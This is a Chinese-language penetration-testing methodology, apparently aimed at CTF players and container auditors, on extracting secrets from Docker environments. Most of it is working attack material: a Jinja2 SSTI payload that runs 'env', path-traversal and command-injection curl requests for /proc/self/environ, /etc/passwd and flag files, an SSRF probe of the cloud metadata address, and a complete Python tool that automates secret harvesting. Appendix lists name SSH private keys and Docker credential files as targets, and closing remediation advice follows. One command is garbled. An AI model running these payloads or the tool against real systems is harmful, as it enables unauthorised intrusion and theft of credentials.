# Docker 环境敏感信息提取方法论

**文档版本：** 1.0  
**创建日期：** 2026 年 3 月 15 日  
**适用技能：** security-misconfiguration, injection

---

# 第一部分：文档概述

## 1.1 编写目的

本文档为渗透测试人员提供 Docker 容器环境中敏感信息提取的系统化方法。Docker 容器虽然提供隔离，但配置不当会导致敏感信息泄露，包括环境变量、挂载卷、容器内文件等。

## 1.2 适用范围

本文档适用于：
- **Docker 容器化应用**：运行在容器中的 Web 应用
- **开发/测试环境**：配置较宽松的容器环境
- **云原生应用**：Kubernetes/Docker Swarm 部署的应用
- **微服务架构**：容器化微服务系统

**典型敏感信息：**
- 环境变量中的 Flag/密钥
- 容器内敏感文件（flag.txt, .env）
- Docker 镜像层中的历史数据
- 挂载卷中的宿主机文件
- 容器日志中的敏感信息

## 1.3 读者对象

- 渗透测试工程师
- CTF 参赛选手
- 容器安全审计人员
- DevOps 工程师
- 应用安全开发人员

---

# 第二部分：核心渗透技术专题

## 专题一：Docker 环境变量提取

### 2.1 技术介绍

**漏洞原理：**

Docker 容器环境变量常用于存储配置信息和敏感数据。在 CTF 挑战和开发环境中，Flag 或密钥常直接存储在环境变量中。攻击者可通过多种方式读取这些变量。

**案例分析：**

敏感信息存储方式：
- Flag 存储在 `/app/flag.txt` 文件中
- 应用启动时读取 flag.txt 到内存
- 容器环境变量可能包含敏感配置

**环境变量泄露途径：**
- 应用错误信息中暴露
- `/proc/self/environ` 文件读取
- 容器检查命令输出
- 日志文件记录
- 应用源码硬编码

### 2.2 信息收集方法

#### 2.2.1 通过应用功能读取

**方法 1：模板注入读取环境变量**

```python
# 如果应用存在 SSTI 漏洞
from jinja2 import Template

# Payload
template = Template("{{ config.__class__.__init__.__globals__['os'].popen('env').read() }}")
print(template.render())
```

**方法 2：错误信息泄露**

```bash
# 触发应用错误，查看堆栈信息
curl http://target/debug
curl http://target/error

# 检查响应中是否包含环境变量
```

**方法 3：端点暴露**

```bash
# 检查是否有暴露环境变量的端点
curl http://target/env
curl http://target/config
curl http://target/info
curl http://target/health
```

#### 2.2.2 通过路径遍历读取

**读取 /proc/self/environ**

```bash
# 如果存在路径遍历漏洞
curl http://target/files?file=/proc/self/environ
curl http://target/download?path=../proc/self/environ

# 响应示例：
# PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# HOSTNAME=abc123
# FLAG=flag{secret_value}
# ...
```

### 2.3 容器内文件提取

#### 2.3.1 常见 Flag 位置

```bash
# CTF 常见 Flag 文件位置
/app/flag.txt
/flag.txt
/root/flag.txt
/home/*/flag.txt
/var/www/flag.txt
/opt/app/flag.txt
/tmp/flag.txt
```

#### 2.3.2 通过应用读取

```bash
# 如果应用有文件读取功能
curl http://target/files?file=/app/flag.txt
curl http://target/download?path=flag.txt
curl http://target/view?file=../flag.txt

# 批量测试
for loc in "/app/flag.txt" "/flag.txt" "./flag.txt" "flag.txt"; do
    echo "[*] 尝试：$loc"
    curl -s "http://target/files?file=$loc" | head -1
done
```

#### 2.3.3 通过命令执行读取

```bash
# 如果存在命令执行漏洞
curl http://target/cmd?cmd="cat /app/flag.txt"
curl http://target/exec?command="ls -la /app/"

# Python 命令执行
curl http://target/eval?code="import os; print(open('/app/flag.txt').read())"
```

### 2.4 Docker 配置信息提取

#### 2.4.1 容器配置泄露

**检查 docker-compose.yml**

```bash
# 如果源码可访问
curl http://target/docker-compose.yml
curl http://target/.dockerignore
curl http://target/Dockerfile

# Git 历史中查找
curl http://target/.git/objects/...
```

**检查容器元数据**

```bash
# 如果有 SSRF 或内部服务访问
curl http://target/ssrf?url=http://169.254.169.254/
# AWS 元数据服务

# Docker 内部 DNS
curl http://target/ssrf?url=http://tasks.backend/
```

#### 2.4.2 挂载卷信息

```bash
# 通过路径遍历探测挂载点
curl http://target/files?file=/mnt/host_data/flag.txt
curl http://target/files?file=/volumes/data/flag.txt

# 常见挂载点
# /mnt/*
# /volumes/*
# /data/*
# /shared/*
```

### 2.5 自动化提取工具

```python
#!/usr/bin/env python3
"""
Docker Secret Extraction Tool
Docker 环境敏感信息自动提取工具
"""

import requests
import re
import sys
from urllib.parse import urljoin

class DockerSecretExtractor:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.found_secrets = {}
        
    def check_path_traversal(self):
        """检测路径遍历漏洞"""
        test_paths = [
            "/etc/passwd",
            "/proc/self/environ",
            "/app/flag.txt",
        ]
        
        print("[*] 检测路径遍历漏洞...")
        
        for path in test_paths:
            # 尝试不同参数名
            for param in ["file", "path", "p", "f"]:
                url = f"{self.base_url}/files?{param}={path}"
                
                try:
                    response = self.session.get(url, timeout=5)
                    
                    if response.status_code == 200:
                        if self.is_valid_content(response.text):
                            print(f"[+] 发现路径遍历：{param}={path}")
                            self.process_content(path, response.text)
                            return True
                except:
                    pass
        
        return False
    
    def is_valid_content(self, content):
        """检查是否是有效文件内容"""
        if len(content) < 10:
            return False
        if "error" in content.lower()[:100]:
            return False
        if "not found" in content.lower()[:100]:
            return False
        return True
    
    def process_content(self, path, content):
        """处理文件内容，提取敏感信息"""
        # 提取 Flag
        flags = re.findall(r'flag\{[a-f0-9-]+\}', content, re.IGNORECASE)
        if flags:
            print(f"[***] 在 {path} 中发现 Flag!")
            for flag in flags:
                print(f"    [FLAG] {flag}")
            self.found_secrets[path] = {"type": "flag", "value": flags}
        
        # 提取环境变量
        if "environ" in path:
            env_vars = {}
            for line in content.split('\n'):
                if '=' in line:
                    key, value = line.split('=', 1)
                    if any(keyword in key.lower() for keyword in 
                           ['flag', 'secret', 'key', 'password', 'token']):
                        env_vars[key] = value
                        print(f"[+] 敏感环境变量：{key}={value}")
            
            if env_vars:
                self.found_secrets["env_vars"] = env_vars
    
    def enumerate_files(self, file_list):
        """批量枚举文件"""
        print(f"[*] 枚举 {len(file_list)} 个文件...")
        
        for file_path in file_list:
            for param in ["file", "path", "p"]:
                url = f"{self.base_url}/files?{param}={file_path}"
                
                try:
                    response = self.session.get(url, timeout=5)
                    
                    if response.status_code == 200 and self.is_valid_content(response.text):
                        print(f"[+] 成功读取：{file_path}")
                        self.process_content(file_path, response.text)
                except:
                    pass
    
    def extract_from_endpoints(self):
        """从常见端点提取"""
        print("[*] 检查常见信息泄露端点...")
        
        endpoints = [
            "/env",
            "/config",
            "/info",
            "/health",
            "/debug",
            "/.env",
            "/config.json",
            "/settings.py",
        ]
        
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}"
            
            try:
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    content = response.text[:500]
                    
                    # 检查 Flag
                    if "flag{" in content.lower():
                        print(f"[+] 在 {endpoint} 中发现 Flag!")
                        flags = re.findall(r'flag\{[a-f0-9-]+\}', content, re.IGNORECASE)
                        for flag in flags:
                            print(f"    [FLAG] {flag}")
            except:
                pass
    
    def run_full_extraction(self):
        """执行完整提取流程"""
        print("=" * 60)
        print("Docker Secret Extraction")
        print("=" * 60)
        
        # 1. 检查路径遍历
        if self.check_path_traversal():
            print("[+] 路径遍历可用，继续提取...")
        
        # 2. 枚举敏感文件
        sensitive_files = [
            "/app/flag.txt",
            "/flag.txt",
            "./flag.txt",
            "/proc/self/environ",
            "/etc/passwd",
            "/app/config.py",
            "/app/.env",
        ]
        self.enumerate_files(sensitive_files)
        
        # 3. 检查端点
        self.extract_from_endpoints()
        
        # 4. 输出结果
        print("\n" + "=" * 60)
        print("提取结果汇总")
        print("=" * 60)
        
        for path, data in self.found_secrets.items():
            print(f"\n[*] {path}:")
            if isinstance(data, dict):
                if data.get("type") == "flag":
                    for flag in data["value"]:
                        print(f"    [FLAG] {flag}")
                else:
                    for key, value in data.items():
                        print(f"    {key}={value}")

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://localhost:38803")
        sys.exit(1)
    
    target = sys.argv[1]
    extractor = DockerSecretExtractor(target)
    extractor.run_full_extraction()

if __name__ == "__main__":
    main()
```

---

# 第三部分：附录

## 3.1 Docker 敏感文件清单

### 应用文件
```
/app/flag.txt
/app/.env
/app/config.py
/app/settings.json
/app/secrets/*
```

### 系统文件
```
/proc/self/environ
/proc/1/environ
/etc/passwd
/etc/hostname
/etc/resolv.conf
```

### 日志文件
```
/var/log/app.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/logs/*
```

### 凭证文件
```
/root/.ssh/id_rsa
/home/*/.ssh/id_rsa
/root/.docker/config.json
```

## 3.2 常见环境变量名

```bash
# CTF Flag
FLAG
CTF_FLAG
THE_FLAG
SECRET_FLAG

# 数据库
DATABASE_URL
MYSQL_PASSWORD
POSTGRES_PASSWORD
MONGO_URI

# API 密钥
API_KEY
SECRET_KEY
JWT_SECRET
AUTH_TOKEN

# 应用配置
APP_ENV
APP_DEBUG
APP_SECRET
```

## 3.3 快速检测命令

```bash
# 路径遍历检测
curl "http://target/files?file=/etc/passwd"
curl "http://target/files?file=/proc/self/environ"
curl "http://target/files?file=/app/flag.txt"

# 端点检测
curl http://target/env
curl http://target/config
curl http://target/.env

# 错误信息检测
curl http://target/debug
curl http/trigger-error
```

## 3.4 修复建议

**给开发人员的修复指南：**

1. **不要将敏感信息存储在环境变量中**
```dockerfile
# ❌ 不安全
ENV FLAG=flag{secret}
ENV SECRET_KEY=mysecret

# ✅ 使用 Docker Secrets 或外部密钥管理
```

2. **使用 Docker Secrets**
```yaml
# docker-compose.yml
version: '3.1'
services:
  app:
    secrets:
      - flag_secret

secrets:
  flag_secret:
    file: ./flag.txt
```

3. **限制容器内文件访问**
```python
# 实现严格的文件访问控制
@app.get("/files")
async def get_file(file: str):
    allowed_files = ["readme.txt", "guide.pdf"]
    if file not in allowed_files:
        raise HTTPException(403)
```

4. **移除调试端点**
```python
# 生产环境禁用调试端点
if os.environ.get("FLASK_ENV") == "production":
    app.debug = False
    # 移除调试路由
```